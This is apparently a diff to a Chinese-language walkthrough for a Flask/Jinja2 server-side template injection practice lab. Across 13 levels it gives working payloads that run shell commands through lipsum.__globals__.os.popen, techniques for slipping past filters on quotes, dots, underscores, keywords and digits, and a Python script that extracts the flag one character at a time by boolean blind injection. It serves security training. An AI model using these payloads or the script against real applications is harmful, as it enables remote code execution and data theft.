@@ -40,14 +40,14 @@ def level1(lev):
 | 2 | `{{` | 换定界符：`{% print(...) %}` |
 | 3 | 盲注（只回 correct / wrong） | 布尔 oracle 或写文件外带 |
 | 4 | `[` `]` | 中括号换点号：`.os` |
-| 5 | `'` `"` | 字符串从请求参数来 |
-| 6 | `_` | 下划线写转义：`\x5f` |
-| 7 | `.` | 点号换 `\|attr('名字')` |
+| 5 | `'` `"` | 只把命令放参数：`request.form.cmd` |
+| 6 | `_` | 只把 `__globals__` 写转义：`\x5f` |
+| 7 | `.` | 点号换中括号：`['键']` |
 | 8 | class arg form value data request init global open mro base attr | 关键词用 `~` 切碎 |
 | 9 | 数字 `0-9` | 全局链本来就不用数字 |
 | 10 | 预置 `config=None` `self=None` | 换 `lipsum` 当起点 |
 | 11 | `'` `"` `+` request `.` `[` `]` | `dict(名=1)\|first` 造字符串 + `~` 拼命令 |
-| 12 | `_` `.` 数字 `\` `'` `"` `[` `]` | 参数带名字 + `dict` 取值 |
+| 12 | `_` `.` 数字 `\` `'` `"` `[` `]` | 只把 `__globals__` 和命令放参数 |
 | 13 | `_` `.` `\` `'` `"` request `+` class init arg config app self `[` `]` | 从字符串里抠下划线造 dunder |
 
 ## 三、逐关详解
@@ -60,7 +60,7 @@ def level1(code):
 ```
 
 ```jinja
-{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
+{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
@@ -74,7 +74,7 @@ def level1(code):
 | `.read()` | 命令输出 | **必须读**；`os.system` 没有回显 |
 
 等价写法：`url_for.__globals__['os']`、`config.__class__.__init__.__globals__['os']`、`cycler.__init__.__globals__.os`、
-`lipsum.__globals__['__builtins__']['open']('/app/flag').read()`。
+`lipsum.__globals__.__builtins__.open('/app/flag').read()`。
 
 ### 第 2 关：禁 `{{`
 
@@ -84,7 +84,7 @@ def level2(code):
 ```
 
 ```jinja
-{% print(lipsum.__globals__['os'].popen('cat /app/flag').read()) %}
+{% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
@@ -109,7 +109,7 @@ def level3(code):
 路 1 · 布尔 oracle
 
 ```jinja
-{% if lipsum.__globals__['os'].popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{ 1/0 }}{% endif %}
+{% if lipsum.__globals__.os.popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{ 1/0 }}{% endif %}
 ```
 
 实测：真条件 → `Hello correct`；`startswith('XXXX')` → `Hello wrong`。
@@ -126,12 +126,66 @@ def level3(code):
 路 2 · 副作用外带（更省事，推荐先试）
 
 ```jinja
-{% set x = lipsum.__globals__['os'].popen('cat /app/flag > /app/static/l3.txt').read() %}
+{% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}
 ```
 
 实测：`Hello correct`，随后 `GET /static/l3.txt` → `SSTILAB{enjoy_flask_ssti}`。
 前提：有写权限（本题 `uid=0`）+ 静态目录对外可访问（Flask 默认挂 `/static`）。
 
+### 脚本思路（最简版，20 行）
+
+一句话：**把「flag 是什么」翻译成一堆只能回答是/否的小问题，一个一个问** —— 第 3 关每次请求只带回 1 bit，
+脚本干的事就是「提问 → 读那 1 bit → 缩小范围 → 再问」。
+
+```python
+import requests
+
+URL = "http://<实例>/level/3"
+READ = "lipsum.__globals__.os.popen('cat /app/flag').read()"
+CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"
+
+
+def ask(cond):                    # 问一个问题：条件真吗？
+    code = "{% if " + cond + " %}a{% else %}{{1/0}}{% endif %}"
+    return requests.post(URL, data={"code": code}).text.endswith("correct")
+
+
+flag = ""
+for _ in range(50):               # 最多猜 50 位
+    for c in CHARS:               # 每位逐个字符试
+        if ask(READ + ".startswith('" + flag + c + "')"):
+            flag += c             # 命中就固定下来，前缀变长一位
+            print(flag)
+            break
+    else:                         # 一个字符都没命中 -> 读到头了
+        break
+    if flag.endswith("}"):
+        break
+print("flag =", flag)
+```
+
+| 块 | 作用 | 关键点 |
+|---|---|---|
+| `data={"code": ...}` | 注入入口 | 第 3 关是 POST，参数名 `code` |
+| `READ` | 被问的对象 | 就是第 1 关那条链，原封不动 |
+| `ask(cond)` | oracle：把条件变成响应差异 | 真 → 输出 `a` 走正常分支；假 → `{{1/0}}` 抛异常 → wrong |
+| `startswith('前缀+c')` | 把「第几位是什么」换成「是不是以…开头」 | 模板里回答不了「第 6 位是几」，但能回答「整串是不是以 `flag{l` 开头」 |
+| `for c in CHARS` | 逐字符试 | 命中就把前缀加长一位 |
+| `for...else: break` | 终止条件 | 一个字符都不命中 = 读到头 |
+| `endswith("}")` | 提前收工 | flag 以 `}` 结尾 |
+
+实测（本地复刻靶机）：**856 次请求、3.3 秒**，把 31 个字符一位不差问出来。
+
+| 方法 | 思路 | 31 位要多少次请求 |
+|---|---|---|
+| 前缀法（上面这个） | 一位一位试字符 | 856 |
+| 二分法 | 一位一位折半逼近（字符能比大小） | 242（只改 `ask` 里那个条件） |
+
+判断顺序：**先试外带（写文件 / 报错 / 时间），外带全封了再上盲注脚本。**
+> 配套脚本（离线也能练）：
+> `sstilab_level3_blind.py` —— 路线 A（写文件外带）+ 路线 B（布尔盲注，二分法/前缀法两种爆破），换实例只改 `--base`；
+> `lab\level3_emulator.py` —— 本地复刻这一关的靶机（同样只回 correct / wrong），Windows 上用 `--read open` 跑。
+> 用法见脚本头部注释。
 ### 第 4 关：禁 `[` `]`
 
 ```jinja
@@ -145,35 +199,35 @@ def level3(code):
 
 ### 第 5 关：禁 `'` `"`
 
-名字不能写字面量，就从**请求参数**拿（参数不受黑名单限制）：
+引号被禁 → 属性名用点号就行（点号不需要引号），**只有命令躲不开**，把它放进请求参数：
 
 ```jinja
-{{ lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.f)() }}
+{{ lipsum.__globals__.os.popen(request.form.cmd).read() }}
 ```
 
-POST 一并带上：`a=__globals__`、`b=__getitem__`、`c=os`、`d=popen`、`e=cat /app/flag`、`f=read`
+POST 时带上 `cmd=cat /app/flag`（想放查询串就把 payload 里的 `request.form.cmd` 改成 `request.args.cmd`）
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 里一个引号都没有）
 
 ### 第 6 关：禁 `_`
 
 ```jinja
-{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /app/flag')|attr('read')() }}
+{{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
 
-原理：`\x5f` 是下划线转义，**编译期**才还原成 `_`；过滤看的是原始输入（里面没有下划线）。
+原理：`\x5f` 是下划线转义，**编译期**才还原成 `_`；过滤看的是原始输入（里面没有下划线）。只需替换这一个带下划线的名字，其余零件（点号、引号）第 6 关都不禁。
 
 ### 第 7 关：禁 `.`
 
 ```jinja
-{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /app/flag')|attr('read')() }}
+{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
 
-原理：属性访问换成 `|attr('名字')` 过滤器 —— 属性名变成字符串，原文里就没有点号。
+原理：点号没了就改用中括号 —— `getitem` 对字符串参数会**反向回退到属性**，所以取函数属性也行；另一条路是 `|attr('名字')`。
 
 ### 第 8 关：关键词黑名单
 
@@ -185,17 +239,17 @@ bl = ["class", "arg", "form", "value", "data", "request", "init", "global", "ope
 `|attr(...)` 含 `attr`、`request`/`form` 被点名。出路是**把词切碎**（`~` 到渲染时才拼起来）：
 
 ```jinja
-{{ lipsum['__glo'~'bals__']['__buil'~'tins__']['__im'~'port__']('subprocess')['check'~'_out'~'put']('cat /app/flag', shell=True)['decode']() }}
+{{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
 ```
 
-实测：`Hello SSTILAB{enjoy_flask_ssti}`（`check_output` 返回 bytes，再 `.decode()`）
+实测：`Hello SSTILAB{enjoy_flask_ssti}`
 
-要点：`__globals__` → `['__glo'~'bals__']`；`popen` 含 `open` 被禁 → 换 `subprocess.check_output(..., shell=True)`。
+要点：只需切碎两个被点名的词 —— `__globals__` → `['__glo'~'bals__']`（避开 `global`）、`popen` → `['pop'~'en']`（避开 `open`）；其余零件照旧。
 
 ### 第 9 关：禁数字 `0-9`
 
 ```jinja
-{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
+{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
@@ -209,7 +263,7 @@ return "{% set config=None%}{% set self=None%}" + code
 ```
 
 ```jinja
-{{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}
+{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
@@ -222,7 +276,7 @@ return "{% set config=None%}{% set self=None%}" + code
 引号、点号、中括号全禁，参数通道（`request`）也被堵死 —— 只能在模板内部造字符串：
 
 ```jinja
-{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~(lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(__file__=1)|first)|first)~(dict(ap=1)|first)~(dict(p=1)|first)~(lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(__file__=1)|first)|first)~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
+{% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
 ```
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
@@ -240,15 +294,15 @@ return "{% set config=None%}{% set self=None%}" + code
 下划线和数字都被禁 → 连 `dict(a=1)` 里的 `1` 都不能写（改用 `true`），名字只能从**查询参数**取：
 
 ```jinja
-{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))() }}
+{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}
 ```
 
-查询串一并带上：`?a=__globals__&b=__getitem__&c=os&d=popen&e=cat /app/flag&f=read`
+查询串一并带上：`?a=__globals__&b=cat /app/flag`
 
 实测：`Hello SSTILAB{enjoy_flask_ssti}`
 
 要点：取参数不用点号 —— `request|attr(dict(args=true)|first)|attr(dict(get=true)|first)` 就是 `request.args.get`；
-数值用 `true` 占位；名字都在 URL 里，不在 `code` 里。
+数值用 `true` 占位；参数只有两个（`__globals__` 和命令），其余名字用 `dict(名=true)|first` 就地造。
 
 ### 第 13 关：全禁（最难）
 
@@ -259,16 +313,17 @@ bl = ['_', '.', '\\', "'", '"', 'request', '+', 'class', 'init', 'arg', 'config'
 `request` 被点名 → 参数通道没了；下划线又被禁 → 连 `__globals__` 都写不出来。解法是**从字符串里抠下划线**：
 
 ```jinja
-{% set u = lipsum|string|list|batch(19)|first|last %}{% set G = (u~u)~(dict(globals=true)|first)~(u~u) %}{% set GI = (u~u)~(dict(getitem=true)|first)~(u~u) %}{% set gl = lipsum|attr(G) %}{% set sl = gl|attr(GI)((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set cmd = (dict(cat=true)|first)~((lipsum|string)|first)~sl~(dict(ap=true)|first)~(dict(p=true)|first)~sl~(dict(flag=true)|first) %}{{ gl|attr(GI)(dict(os=true)|first)|attr(dict(popen=true)|first)(cmd)|attr(dict(read=true)|first)() }}
+{% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
 ```
 
-实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 共 946 字符）
+实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 共 439 字符）
 
 | 要造的东西 | 怎么造 | 说明 |
 |---|---|---|
 | 下划线 `_` | `lipsum\|string\|list\|batch(19)\|first\|last` | `lipsum` 的 repr 是 `<function generate_lorem_ipsum at 0x...>`，第 19 个字符正是 `_`（实测） |
 | `__globals__` | `(u~u)~(dict(globals=true)\|first)~(u~u)` | 用抠出的下划线拼 dunder；`globals` 本身不含下划线 |
 | 斜杠 `/` | `...('__file__')\|first` | 取 `jinja2/utils.py` 路径首字符 |
+| 省长度 | `dict(get=true)|first` | 对字典来说 `get('os')` 就够，不必造 `__getitem__`（少 8 个字符） |
 | `app` | `dict(ap=true)\|first~dict(p=true)\|first` | `app` 在黑名单里，必须切两半 |
 | 命令无空格 | `cat</app/flag` | 用 shell 重定向代替空格 |
 
